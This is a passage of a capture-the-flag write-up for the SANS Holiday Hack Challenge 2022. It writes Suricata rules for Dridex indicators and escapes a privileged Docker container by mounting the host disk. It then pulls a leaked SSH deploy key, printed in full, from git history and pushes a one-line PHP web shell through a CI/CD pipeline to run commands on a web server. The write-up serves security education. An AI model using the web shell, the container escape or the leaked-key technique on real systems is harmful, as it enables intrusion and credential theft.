    First rule looks good!

    STINC thanks you for your work with that DNS record! In this PCAP, it points to 192.185.57.242.
    Develop a Suricata rule that alerts whenever the infected IP address 192.185.57.242 communicates with internal systems over HTTP.
    When there's a match, the message (msg) should read Investigate suspicious connections, possible Dridex infection

Our first rule seems correct, and we must now write a second one that creates
an alert when HTTP communications occur with :code:`192.185.57.242`:

.. code-block:: text

    alert http 192.185.57.242 any -> $HOME_NET any (msg:"Investigate suspicious connections, possible Dridex infection";sid:1338;)
    alert http $HOME_NET any -> 192.185.57.242 any (msg:"Investigate suspicious connections, possible Dridex infection";sid:1339;)

Let's check our new rules:

.. code-block:: console
    :hl_lines: 8 11 12

    elf@703ea04f1883:~$ ./rule_checker
    3/1/2023 -- 14:31:06 - <Notice> - This is Suricata version 6.0.8 RELEASE running in USER mode
    3/1/2023 -- 14:31:06 - <Notice> - all 5 packet processing threads, 4 management threads initialized, engine started.
    3/1/2023 -- 14:31:06 - <Notice> - Signal Received.  Stopping engine.
    3/1/2023 -- 14:31:07 - <Notice> - Pcap-file module read 1 files, 5172 packets, 3941260 bytes
    First rule looks good!

    Second rule looks good!

    We heard that some naughty actors are using TLS certificates with a specific CN.
    Develop a Suricata rule to match and alert on an SSL certificate for heardbellith.Icanwepeh.nagoya.
    When your rule matches, the message (msg) should read Investigate bad certificates, possible Dridex infection

Here's the corresponding Suricata rule:

.. code-block:: text

    alert tls any any -> any any (msg:"Investigate bad certificates, possible Dridex infection"; tls.cert_subject; content:"heardbellith.Icanwepeh.nagoya"; nocase;sid:1340;)

Let's check it:

.. code-block:: console
    :hl_lines: 10 13 14

    elf@703ea04f1883:~$ ./rule_checker
    3/1/2023 -- 14:32:38 - <Notice> - This is Suricata version 6.0.8 RELEASE running in USER mode
    3/1/2023 -- 14:32:38 - <Notice> - all 5 packet processing threads, 4 management threads initialized, engine started.
    3/1/2023 -- 14:32:38 - <Notice> - Signal Received.  Stopping engine.
    3/1/2023 -- 14:32:38 - <Notice> - Pcap-file module read 1 files, 5172 packets, 3941260 bytes
    First rule looks good!

    Second rule looks good!

    Third rule looks good!

    OK, one more to rule them all and in the darkness find them.
    Let's watch for one line from the JavaScript: let byteCharacters = atob
    Oh, and that string might be GZip compressed - I hope that's OK!
    Just in case they try this again, please alert on that HTTP data with message Suspicious JavaScript function, possible Dridex infection

We're told that the content might be compressed using GZip. Luckily, according
to `Suricata's documentation <https://suricata.readthedocs.io/en/suricata-6.0.0/rules/http-keywords.html#id1>`__,
using :code:`http.response_body` allows to match on GZipped-content:

.. code-block:: text

     alert http any any -> any any (msg:"Suspicious JavaScript function, possible Dridex infection";http.response_body; content:"let byteCharacters = atob"; sid:1341;)

One last time:

.. code-block:: console
    :hl_lines: 6 8 10 12

    elf@703ea04f1883:~$ ./rule_checker
    3/1/2023 -- 14:42:38 - <Notice> - This is Suricata version 6.0.8 RELEASE running in USER mode
    3/1/2023 -- 14:42:38 - <Notice> - all 5 packet processing threads, 4 management threads initialized, engine started.
    3/1/2023 -- 14:42:38 - <Notice> - Signal Received.  Stopping engine.
    3/1/2023 -- 14:42:38 - <Notice> - Pcap-file module read 1 files, 5172 packets, 3941260 bytes
    First rule looks good!

    Second rule looks good!

    Third rule looks good!

    Fourth rule looks good! You've done it - thank you!

This gives us our first ring, the Tolkien Ring:

.. image:: /images/sans-christmas-challenge-2022/tolkien_ring.png
    :alt: The Tolkien Ring. It's a simple golden ring, like the one from Lord
        of the Rings, etched with a network diagram resembling a token ring
        network.
    :align: center

.. image:: /images/sans-christmas-challenge-2022/fitzyshortstack.png
    :alt: Dusty Giftwrap, same image as before.
    :align: center

*Fitzy Shortstack says*

    Woo hoo - you wielded Suricata magnificently! Thank you!

    Now to shout the final warning of power to the Snowrog...

    YOU...SHALL NOT...PASS!!!

And with that, the Snowrog disapears! As we leave, we see Grinchum:

.. image:: /images/sans-christmas-challenge-2022/smeagolmad1.png
    :alt: Grinchum is now frowning.
    :align: center

*Grinchum says*

    😒 *Who took you, Precious? How did they take you? Mustn't happen again.*

    🙂 **Oh, hello, humanses. Maybe we can offer help?**

    😏 **Yes... Grinchum will help the humanses.**

    *We are trying to distract them from finding the rest of you, Preciouses,
    with talk of hints and coinses.*

    🙂 **Have you found the coffers yet? The ones at the end of hidden paths?**

    😏 **There's hintses in them, and coinses, they're veeerrryy special.**

    🙂 **Just look hard, for little, bitty, speckles or other oddities.**

    *Don't worry, they will not look for you, Preciouses. Shhh...*

    🙂 **Go on, humanses. Start searching!**

Recover the Elfen Ring
~~~~~~~~~~~~~~~~~~~~~~

We keep making our way down where we find Morcel Nougat. He teaches us about
another kind of people, the `Flobbits <https://en.wikipedia.org/wiki/Hobbit>`__.

.. image:: /images/sans-christmas-challenge-2022/morcelnougat.png
    :alt: Morcel Nougat is an elf with slanted eyes, with a beard on his chin
        and a mustache. He's wearing a white T-Shirt, brown-greenish pants,
        dark green shoes, and a yellow Christmas hat.
    :align: center

*Morcel Nougat says*

    Hello, I'm Morcel Nougat, elf extraordinaire!

    I was in the first group of elves that started digging into the snow.

    Eventually, we burrowed deep enough that we came upon an already existing
    tunnel network.

    As we explored it, we encountered a people that claimed to be the Flobbits.

    We were all astonished, because we learn a little about the Flobbits in
    history class, but nobody's ever seen them.

    They were part of the Great Schism hundreds of years ago that split the
    Munchkins and the Elves.

    Not much else was known, until we met them in the tunnels! Turns out, their
    exodus took them to Middle Earth.

    They only appear when the 5 Rings are in jeopardy. Though, the Rings
    weren't lost until after we started digging. Hmm...

    Anyways, be careful as you venture down further. I hear something sinister
    is in the depths of these tunnels.

Clone with a Difference
-----------------------

We keep going, take a boat, and meet Bow Ninecandle:

.. image:: /images/sans-christmas-challenge-2022/bowninecandle.png
    :alt: Bow Ninecandle is an elf wearing a white T-Shirt, brown-greenish
        pants, dark blue shoes, and a purple Christmas hat. He's smiling from
        ear to ear.
    :align: center

*Bow Ninecandle says*

    Well hello! I'm Bow Ninecandle!

    Have you ever used Git before? It's so neat!

    It adds so much convenience to DevOps, like those times when a new person
    joins the team.

    They can just clone the project, and start helping out right away!

    Speaking of, maybe you could help me out with cloning this repo?

    I've heard there's multiple methods, but I only know how to do one.

    If you need more help, check out the `panel of very senior DevOps experts.
    <https://youtu.be/vIQY_FH1SVk>`__

Let's give him a hand:

.. code-block:: text

    We just need you to clone one repo: git clone git@haugfactory.com:asnowball/aws_scripts.git
    This should be easy, right?

    Thing is: it doesn't seem to be working for me. This is a public repository though. I'm so confused!

    Please clone the repo and cat the README.md file.
    Then runtoanswer and tell us the last word of the README.md file!

Bow seems to try to clone the Git repository through SSH. If we try the
command, we can see that it indeed tries to connect through SSH (since we must
accept the SSH server key) and then fails because we don't have enough rights:

.. code-block:: console

    bow@c573fb1d9664:~$ git clone git@haugfactory.com:asnowball/aws_scripts.git
    Cloning into 'aws_scripts'...
    The authenticity of host 'haugfactory.com (34.171.230.38)' can't be established.
    ECDSA key fingerprint is SHA256:CqJXHictW5q0bjAZOknUyA2zzRgSEJLmdMo4nPj5Tmw.
    Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
    Warning: Permanently added 'haugfactory.com,34.171.230.38' (ECDSA) to the list of known hosts.
    git@haugfactory.com: Permission denied (publickey).
    fatal: Could not read from remote repository.

    Please make sure you have the correct access rights
    and the repository exists.

Indeed, it seems that `anonymous SSH access is not possible
<https://stackoverflow.com/a/46993922>`__. So let's convert the command to use
HTTPS, which allows anonymous access:

.. code-block:: console

    bow@c573fb1d9664:~$ git clone https://haugfactory.com/asnowball/aws_scripts
    Cloning into 'aws_scripts'...
    warning: redirecting to https://haugfactory.com/asnowball/aws_scripts.git/
    remote: Enumerating objects: 64, done.
    remote: Total 64 (delta 0), reused 0 (delta 0), pack-reused 64
    Unpacking objects: 100% (64/64), 23.83 KiB | 1.32 MiB/s, done.

Great, it works! Now let's look at the last word in the :code:`README.md` file
and answer:

.. code-block:: console

    bow@c573fb1d9664:~$ tail -n 1 aws_scripts/README.md
    If you have run out of energy or time for your project, put a note at the top of the README saying that development has slowed down or stopped completely. Someone may choose to fork your project or volunteer to step in as a maintainer or owner, allowing your project to keep going. You can also make an explicit request for maintainers.
    bow@c573fb1d9664:~$ runtoanswer
                                            Read that repo!
    What's the last word in the README.md file for the aws_scripts repo?

    > maintainers
    Your answer: maintainers

    Checking......
    Your answer is correct!

.. image:: /images/sans-christmas-challenge-2022/bowninecandle.png
    :alt: Bow Ninecandle, same image as before.
    :align: center

*Bow Ninecandle says*

    Wow - great work! Thank you!

    Say, if you happen to be testing containers for security, there are some
    things you should think about.

    Developers love to give ALL TeH PERMz so that things "just work," but it
    can cause real problems.

    It's always smart to check for excessive user and container permissions.

    You never know! You might be able to interact with host processes or
    filesystems!

Prison Escape
-------------

We go on our merry watery way, where we find a house. We meet Tinsel Upatree:

.. image:: /images/sans-christmas-challenge-2022/tinselupatree.png
    :alt: Tinsel Upatree is an elf with a white mustache, a white sweater,
        blue pants, black snow boots and a green Christmas hat.
    :align: center

*Tinsel Upatree says*

    Hiya hiya, I'm Tinsel Upatree!

    Check me out, I'm working side-by-side with a real-life Flobbit. Epic!

    Anyway, would ya' mind looking at this terminal with me?

    It takes a few seconds to start up, but then you're logged into a super
    secure container environment!

    Or maybe it isn't so secure? I've heard about container escapes, and it has
    me a tad worried.

    Do you think you could test this one for me? I'd appreciate it!

According to our badge, we must get the content of the file
:code:`/home/jailer/.ssh/jail.key.priv`. Let's have a look:

.. code-block:: text

    Greetings Noble Player,

    You find yourself in a jail with a recently captured Dwarven Elf.

    He desperately asks your help in escaping for he is on a quest to aid a
    friend in a search for treasure inside a crypto-mine.

    If you can help him break free of his containment, he claims you would
    receive "MUCH GLORY!"

    Please, do your best to un-contain yourself and find the keys to both of
    your freedom.

This is most likely a Docker-escape challenge. Let's see if we are `running in
a Docker container <https://stackoverflow.com/a/23558932>`__:


.. code-block:: console

    grinchum-land:~$ cat /proc/1/cgroup
    11:cpuset:/docker/517a4547bbc41db2dbf4b434b5a7fac6c5d75592e32e44dcd8fdb1be5348b5a4
    10:pids:/docker/517a4547bbc41db2dbf4b434b5a7fac6c5d75592e32e44dcd8fdb1be5348b5a4
    9:devices:/docker/517a4547bbc41db2dbf4b434b5a7fac6c5d75592e32e44dcd8fdb1be5348b5a4
    8:freezer:/docker/517a4547bbc41db2dbf4b434b5a7fac6c5d75592e32e44dcd8fdb1be5348b5a4
    7:blkio:/docker/517a4547bbc41db2dbf4b434b5a7fac6c5d75592e32e44dcd8fdb1be5348b5a4
    6:perf_event:/docker/517a4547bbc41db2dbf4b434b5a7fac6c5d75592e32e44dcd8fdb1be5348b5a4
    5:memory:/docker/517a4547bbc41db2dbf4b434b5a7fac6c5d75592e32e44dcd8fdb1be5348b5a4
    4:hugetlb:/docker/517a4547bbc41db2dbf4b434b5a7fac6c5d75592e32e44dcd8fdb1be5348b5a4
    3:net_cls,net_prio:/docker/517a4547bbc41db2dbf4b434b5a7fac6c5d75592e32e44dcd8fdb1be5348b5a4
    2:cpu,cpuacct:/docker/517a4547bbc41db2dbf4b434b5a7fac6c5d75592e32e44dcd8fdb1be5348b5a4
    1:name=systemd:/docker/517a4547bbc41db2dbf4b434b5a7fac6c5d75592e32e44dcd8fdb1be5348b5a4
    0::/docker/517a4547bbc41db2dbf4b434b5a7fac6c5d75592e32e44dcd8fdb1be5348b5a4

Yeah, definitely a Docker container. Let's try `common Docker escape techniques
<https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation>`__
(shout out to `@carlospolop <https://twitter.com/carlospolopm>`__, I often use
his `PEASS <https://github.com/carlospolop/PEASS-ng>`__ during engagements).

The usual technique is to check if we're running in a privileged container. The
command to check is :code:`capsh --print`:

.. code-block:: console

    grinchum-land:~$ capsh --print
    -bash: capsh: command not found

Hmm, we don't have the :code:`capsh` command. Another technique to check if
we're in a privileged container is to `use a command that necessitates a
privileged capacity <https://betterprogramming.pub/escaping-docker-privileged-containers-a7ae7d17f5a1>`__.
Let's use the command given in `@vickieli7 <https://twitter.com/vickieli7>`__'s
article:

.. code-block:: console

    grinchum-land:~$ sudo ip link add dummy0 type dummy
    grinchum-land:~$ ip link sh dummy0
    2: dummy0: <BROADCAST,NOARP> mtu 1500 qdisc noop state DOWN qlen 1000
        link/ether e2:9f:f0:fc:53:3e brd ff:ff:ff:ff:ff:ff

It seems that it worked, yay! We're most likely running in a privileged
container. We can try to `mount the host's disk <https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout/docker-breakout-privilege-escalation#mounting-disk-poc1>`__
so that we can access it through the container. Let's first find the correct
partition:

.. code-block:: console

    grinchum-land:~$ sudo fdisk -l
    Disk /dev/vda: 2048 MB, 2147483648 bytes, 4194304 sectors
    2048 cylinders, 64 heads, 32 sectors/track
    Units: sectors of 1 * 512 = 512 bytes

    Disk /dev/vda doesn't contain a valid partition table

The disk is apparently :code:`/dev/vda`, but it does not have a partition
table. Maybe we can try and mount it as is:

.. code-block:: console

    grinchum-land:~$ sudo mount /dev/vda /mnt
    grinchum-land:~$ ls /mnt
    bin   dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
    boot  etc  lib   lib64  lost+found  mnt    proc  run   srv   tmp  var

Looks good! Let's recover the :code:`/mnt/home/jailer/.ssh/jail.key.priv`
file:

.. code-block:: console
    :hl_lines: 38

    grinchum-land:~$ cat /mnt/home/jailer/.ssh/jail.key.priv

                    Congratulations!

              You've found the secret for the
              HHC22 container escape challenge!

                         .--._..--.
                  ___   ( _'-_  -_.'
              _.-'   `-._|  - :- |
          _.-'           `--...__|
       .-'                       '--..___
      / `._                              \
       `. `._               one           |
         `. `._                           /
           '. `._    :__________....-----'
             `..`---'    |-_  _- |___...----..._
                         |_....--'             `.`.
                   _...--'                       `.`.
              _..-'                             _.'.'
           .-'             step                _.'.'
           |                               _.'.'
           |                   __....------'-'
           |     __...------''' _|
           '--'''        |-  - _ |
                   _.-''''''''''''''''''-._
                _.'                        |\
              .'                         _.' |
              `._          closer           |:.'
                `._                     _.' |
                   `..__                 |  |
                        `---.._.--.    _|  |
                         | _   - | `-.._|_.'
              .--...__   |   -  _|
             .'_      `--.....__ |
            .'_                 `--..__
           .'_                         `.
          .'_    082bb339ec19de4935867   `-.
          `--..____                        _`.
                   ```--...____          _..--'
                         | - _ ```---.._.'
                         |   - _ |
                         |_ -  - |
                         |   - _ |
                         | -_  -_|
                         |   - _ |
                         |   - _ |
                         | -_  -_|

The answer is :code:`082bb339ec19de4935867`.

.. image:: /images/sans-christmas-challenge-2022/tinselupatree.png
    :alt: Tinsel Upatree, same image as before.
    :align: center

*Tinsel Upatree says*

    Great! Thanks so much for your help!

    Now that you've helped me with this, I have time to tell you about the
    deployment tech I've been working on!

    Continuous Integration/Continuous Deployment pipelines allow developers to
    iterate and innovate quickly.

    With this project, once I push a commit, a GitLab runner will automatically
    deploy the changes to production.

    WHOOPS! I didn’t mean to commit that to
    http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git...

    Unfortunately, if attackers can get in that pipeline, they can make an
    awful mess of things!

Jolly CI/CD
-----------

.. image:: /images/sans-christmas-challenge-2022/rippinproudboot.png
    :alt: Rippin Proudboot is a Flobbit with brown skin with brown curly hait.
        He's wearing a white shirt, a green jacket, black pants. His hairy feet
        are bare.
    :align: center

*Rippin Proudboot says*

    Yes, hello, I'm Rippin Proudboot. Can I help you?

    Oh, you'd like to help me? Well, I'm not quite sure you can, but we shall
    see.

    The elves here introduced me to this new CI/CD technology. It seems quite
    efficient.

    Unfortunately, the sporcs seem to have gotten their grubby mits on it as
    well, along with the Elfen Ring.

    They've used CI/CD to launch a website, and the Elfen Ring to power it.

    Might you be able to check for any misconfigurations or vulnerabilities in
    their CI/CD pipeline?

    If you do find anything, use it to exploit the website, and get the ring
    back!

Let's connect to the terminal. Careful, once connected to the terminal, we must
still wait for the virtual environment to spin up other resources, so I advise
you to wait a couple of minutes before trying anything.

.. code-block:: text

    Greetings Noble Player,

    Many thanks for answering our desperate cry for help!

    You may have heard that some evil Sporcs have opened up a web-store selling
    counterfeit banners and flags of the many noble houses found in the land of
    the North! They have leveraged some dastardly technology to power their
    storefront, and this technology is known as PHP!

    ***gasp***

    This strorefront utilizes a truly despicable amount of resources to keep
    the website up. And there is only a certain type of Christmas Magic capable
    of powering such a thing… an Elfen Ring!

    Along with PHP there is something new we've not yet seen in our land.
    A technology called Continuous Integration and Continuous Deployment!

    Be wary!

    Many fair elves have suffered greatly but in doing so, they've managed to
    secure you a persistent connection on an internal network.

    BTW take excellent notes!

    Should you lose your connection or be discovered and evicted the
    elves can work to re-establish persistence. In fact, the sound off fans
    and the sag in lighting tells me all the systems are booting up again right
    now.

    Please, for the sake of our Holiday help us recover the Ring and save
    Christmas!

Looks like the Sporcs are running a web-store powered by an Elfen Ring. If we
can compromise the web site, we can get our hands on the ring.

If we look back at what Tinsel told us, he published an unexpected thing on
http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git.
Let's clone the repository and have a look at the Git log:

.. code-block:: console
    :hl_lines: 40 44

    grinchum-land:~$ git clone http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git
    Cloning into 'wordpress.flag.net.internal'...
    remote: Enumerating objects: 10195, done.
    remote: Total 10195 (delta 0), reused 0 (delta 0), pack-reused 10195
    Receiving objects: 100% (10195/10195), 36.49 MiB | 20.78 MiB/s, done.
    Resolving deltas: 100% (1799/1799), done.
    Updating files: 100% (9320/9320), done.
    grinchum-land:~$ cd wordpress.flag.net.internal
    commit 37b5d575bf81878934adb937a4fff0d32a8da105
    grinchum-land:~/wordpress.flag.net.internal$ git log
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Wed Oct 26 13:58:15 2022 -0700

        updated wp-config

    commit a59cfe83522c9aeff80d49a0be2226f4799ed239
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Wed Oct 26 12:41:05 2022 -0700

        update gitlab.ci.yml

    commit a968d32c0b58fd64744f8698cbdb60a97ec604ed
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Tue Oct 25 16:43:48 2022 -0700

        test

    commit 7093aad279fc4b57f13884cf162f7d80f744eea5
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Tue Oct 25 15:08:14 2022 -0700

        add gitlab-ci

    commit e2208e4bae4d41d939ef21885f13ea8286b24f05
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Tue Oct 25 13:43:53 2022 -0700

        big update

    commit e19f653bde9ea3de6af21a587e41e7a909db1ca5
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Tue Oct 25 13:42:54 2022 -0700

        whoops

    commit abdea0ebb21b156c01f7533cea3b895c26198c98
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Tue Oct 25 13:42:13 2022 -0700

        added assets

    commit a7d8f4de0c594a0bbfc963bf64ab8ac8a2f166ca
    Author: knee-oh <sporx@kringlecon.com>
    Date:   Mon Oct 24 17:32:07 2022 -0700

        init commit

Commit :code:`e19f653bde9ea3de6af21a587e41e7a909db1ca5` has a message that
says :code:`whoops`. This is obviously a commit that tries to correct an error.
Let's see the difference between this commit and the previous one:

.. code-block:: console

    grinchum-land:~/wordpress.flag.net.internal$ git diff abdea0ebb21b156c01f7533cea3b895c26198c98..e19f653bde9ea3de6af21a587e41e7a909db1ca5
    diff --git a/.ssh/.deploy b/.ssh/.deploy
    deleted file mode 100644
    index 3f7a9e3..0000000
    --- a/.ssh/.deploy
    +++ /dev/null
    @@ -1,7 +0,0 @@
    ------BEGIN OPENSSH PRIVATE KEY-----
    -b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
    -QyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4gAAAJiQFTn3kBU5
    -9wAAAAtzc2gtZWQyNTUxOQAAACD+wLHSOxzr5OKYjnMC2Xw6LT6gY9rQ6vTQXU1JG2Qa4g
    -AAAEBL0qH+iiHi9Khw6QtD6+DHwFwYc50cwR0HjNsfOVXOcv7AsdI7HOvk4piOcwLZfDot
    -PqBj2tDq9NBdTUkbZBriAAAAFHNwb3J4QGtyaW5nbGVjb24uY29tAQ==
    ------END OPENSSH PRIVATE KEY-----
    diff --git a/.ssh/.deploy.pub b/.ssh/.deploy.pub
    deleted file mode 100644
    index 8c0b43c..0000000
    --- a/.ssh/.deploy.pub
    +++ /dev/null
    @@ -1 +0,0 @@
    -ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP7AsdI7HOvk4piOcwLZfDotPqBj2tDq9NBdTUkbZBri sporx@kringlecon.com

The commit deletes two files, called :code:`.ssh/.deploy` and
:code:`.ssh/.deploy.pub`, a public/private SSH key pair. Given the name, it's
most likely an SSH key pair used to deploy to the Git repository.

This means that we can most likely commit code to the Git repository. What's
more, we were told that there's a CI/CD mechanism that will automatically
deploy new versions of the website when there's a new commit. We can see that
in the CI/CD configuration file in the Git repository:

.. code-block:: console

    grinchum-land:~/wordpress.flag.net.internal$ cat .gitlab-ci.yml
    stages:
      - deploy

    deploy-job:
      stage: deploy
      environment: production
      script:
        - rsync -e "ssh -i /etc/gitlab-runner/hhc22-wordpress-deploy" --chown=www-data:www-data -atv --delete --progress ./ root@wordpress.flag.net.internal:/var/www/html

So, if we commit a malicious file, say a web shell, it will be deployed on the
Sporcs web-store, and we can take control of it.

Let's prepare our local environment so we can push to the Git repository using
the SSH key pair we found.

First, we'll recover the private key:

.. code-block:: console

    grinchum-land:~/wordpress.flag.net.internal$ git checkout abdea0ebb21b156c01f7533cea3b895c26198c98
    Note: switching to 'abdea0ebb21b156c01f7533cea3b895c26198c98'.

    You are in 'detached HEAD' state. You can look around, make experimental
    changes and commit them, and you can discard any commits you make in this
    state without impacting any branches by switching back to a branch.

    If you want to create a new branch to retain commits you create, you may
    do so (now or later) by using -c with the switch command. Example:

      git switch -c <new-branch-name>

    Or undo this operation with:

      git switch -

    Turn off this advice by setting config variable advice.detachedHead to false

    HEAD is now at abdea0e added assets

    grinchum-land:~/wordpress.flag.net.internal$ cp .ssh/.deploy ~/deploy

We'll put the correct rights on it, and create a working SSH configuration so
that the key is used for the Git repository:

.. code-block:: console

    grinchum-land:~/wordpress.flag.net.internal$ chmod 600 ~/deploy
    grinchum-land:~/wordpress.flag.net.internal$ mkdir ~/.ssh
    grinchum-land:~/wordpress.flag.net.internal$ cat << EOF > ~/.ssh/config
    > Host gitlab.flag.net.internal
    >         User git
    >         IdentityFile /home/samways/deploy
    > EOF

Then, we must configure the :code:`remote` of our Git repository to use SSH.
Indeed, since we cloned the repository through HTTP, the :code:`remote` is
configured with this protocol:

.. code-block:: console

    grinchum-land:~/wordpress.flag.net.internal$ git remote -v
    origin  http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git (fetch)
    origin  http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git (push)

So let's modify our :code:`remote` so that it uses the SSH protocol:

.. code-block:: console

    grinchum-land:~/wordpress.flag.net.internal$ git remote set-url --add origin git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git
    grinchum-land:~/wordpress.flag.net.internal$ git remote set-url --delete origin  http://gitlab.flag.net.internal/rings-of-powder/wordpress.flag.net.internal.git

Let's check if everything is fine:

.. code-block:: console

    grinchum-land:~/wordpress.flag.net.internal$ git remote -v
    origin  git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git (fetch)
    origin  git@gitlab.flag.net.internal:rings-of-powder/wordpress.flag.net.internal.git (push)

Perfect! Now we just configure our local Git install with a name and an email
address:

.. code-block:: console

    grinchum-land:~/wordpress.flag.net.internal$ git config --global user.email "samways@grinchum-land.flag.net.internal"
    grinchum-land:~/wordpress.flag.net.internal$ git config --global user.name "samways@grinchum-land.flag.net.internal"

And we're all set! Now, we can make our malicious commit. Let's
:code:`checkout` back to the most recent commit, and create our web shell:

.. code-block:: console

    grinchum-land:~/wordpress.flag.net.internal$ git checkout main
    Previous HEAD position was abdea0e added assets
    Switched to branch 'main'
    Your branch is up to date with 'origin/main'.
    grinchum-land:~/wordpress.flag.net.internal$ cat << EOF > cmd.php
    >     <?php system($_GET['c']); ?>
    > EOF

It's commit time:

.. code-block:: console

    grinchum-land:~/wordpress.flag.net.internal$ git add cmd.php
    grinchum-land:~/wordpress.flag.net.internal$ git commit -m "important commit"
    [main 0d54146] important commit
     1 file changed, 1 insertion(+)
     create mode 100644 cmd.php
    grinchum-land:~/wordpress.flag.net.internal$ git push
    Enumerating objects: 4, done.
    Counting objects: 100% (4/4), done.
    Delta compression using up to 2 threads
    Compressing objects: 100% (2/2), done.
    Writing objects: 100% (3/3), 308 bytes | 308.00 KiB/s, done.
    Total 3 (delta 1), reused 0 (delta 0), pack-reused 0
    To gitlab.flag.net.internal:/rings-of-powder/wordpress.flag.net.internal.git
       37b5d57..0d54146  main -> main

We wait a couple of seconds for the CI/CD pipeline to publish our webshell,
aaaaand:

.. code-block:: console

    grinchum-land:~$ curl http://wordpress.flag.net.internal/cmd.php?c=whoami
    www-data

Voilà! Now we can look at the :code:`/flag.txt` file:

.. code-block:: console
    :hl_lines: 29

    grinchum-land:~$ curl http://wordpress.flag.net.internal/cmd.php?c=cat+/flag.txt

                               Congratulations! You've found the HHC2022 Elfen Ring!


                                            ░░░░            ░░░░
                                    ░░                              ░░░░
                                ░░                                      ░░░░
                                                                            ░░
                          ░░                                                  ░░░░
                                                                                  ░░
                                          ░░░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░░░                  ░░
                                      ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒░░                ░░
                                  ░░▒▒▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▒▒                ░░
                              ░░▒▒▒▒▓▓▓▓▓▓▓▓▓▓░░              ▓▓▓▓▓▓▓▓▒▒░░░░            ░░░░
              ░░            ░░▒▒▓▓▓▓▓▓▓▓                            ▓▓▓▓▓▓▒▒░░            ░░░░
                          ░░▒▒▓▓▓▓▓▓                                    ▓▓▒▒▒▒░░          ░░░░
                          ▒▒▓▓▓▓▓▓                                        ▓▓▓▓▒▒░░          ░░░░
          ░░            ▒▒▓▓▓▓▓▓                                            ▓▓▒▒░░░░        ░░░░▒▒
                      ░░▒▒▓▓▓▓░░                                            ░░▒▒▒▒░░░░      ░░░░▒▒
                      ░░▓▓▓▓▓▓                                                ▓▓▒▒░░░░      ░░░░▒▒
        ░░            ▒▒▓▓▓▓                                                    ▒▒░░░░        ░░▒▒▒▒
        ░░          ░░▓▓▓▓▓▓                                                    ▒▒▒▒░░░░      ░░▒▒▒▒
        ░░          ▒▒▓▓▓▓                                                        ▒▒░░░░      ░░▒▒▒▒
                    ▒▒▓▓▓▓                                                        ▒▒░░░░░░    ░░▒▒▒▒
      ░░          ░░▓▓▓▓▒▒                                                        ▒▒░░░░░░    ░░▒▒▒▒▓▓
      ░░          ▒▒▓▓▓▓                                                            ░░░░░░░░  ░░▒▒▒▒▓▓
      ░░          ▒▒▓▓▓▓                                                            ░░░░░░░░  ░░▒▒▒▒▓▓
      ░░          ▒▒▓▓▓▓               oI40zIuCcN8c3MhKgQjOMN8lfYtVqcKT             ░░░░░░░░  ░░▒▒▒▒▓▓
      ░░░░        ▒▒▓▓▓▓                                                            ░░░░  ░░░░░░▒▒▒▒▓▓
      ░░░░        ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
      ▒▒░░        ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
      ▒▒░░░░      ▒▒▓▓▓▓                                                            ░░    ░░░░▒▒▒▒▒▒▓▓
      ▓▓░░░░      ░░▓▓▓▓▒▒                                                        ░░      ░░░░▒▒▒▒▓▓▓▓
        ▒▒░░        ▒▒▓▓▓▓                                                        ░░    ░░░░▒▒▒▒▒▒▓▓
        ▒▒░░░░      ░░▓▓▓▓                                                        ░░    ░░░░▒▒▒▒▓▓▓▓
        ▓▓▒▒░░      ░░▒▒▓▓▓▓                                                    ░░      ░░▒▒▒▒▒▒▓▓▓▓
        ▓▓▒▒░░░░      ▒▒▒▒▓▓                                                          ░░░░▒▒▒▒▒▒▓▓▓▓
          ▒▒▒▒░░░░    ▒▒▒▒▒▒▒▒                                                        ░░▒▒▒▒▒▒▒▒▓▓
          ▓▓▒▒░░░░    ░░░░▒▒▒▒▓▓                                            ░░      ░░░░▒▒▒▒▒▒▓▓▓▓
            ▒▒▒▒░░░░    ░░▒▒▒▒▒▒▒▒                                        ░░      ░░░░▒▒▒▒▒▒▒▒▓▓
              ▓▓▒▒░░░░  ░░░░░░░░▒▒▓▓                                    ░░      ░░░░▒▒▒▒▒▒▓▓▓▓
              ▓▓▓▓▒▒░░░░░░░░░░░░░░▒▒▒▒▓▓                            ░░        ░░░░▒▒▒▒▒▒▓▓▓▓▓▓
                ▓▓▓▓▒▒░░░░░░░░░░░░░░░░▒▒▒▒▒▒▒▒                ░░░░          ░░░░▒▒▒▒▒▒▓▓▓▓▓▓
                  ▓▓▓▓▒▒░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░░                ░░░░▒▒▒▒▒▒▓▓▓▓▓▓
                    ▓▓▒▒▒▒▒▒░░░░░░░░░░░░░░░░░░                        ░░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓
                      ▓▓▓▓▓▓▒▒▒▒░░░░░░░░░░░░░░░░              ░░░░░░░░▒▒▒▒▒▒▒▒▒▒▓▓▓▓▓▓
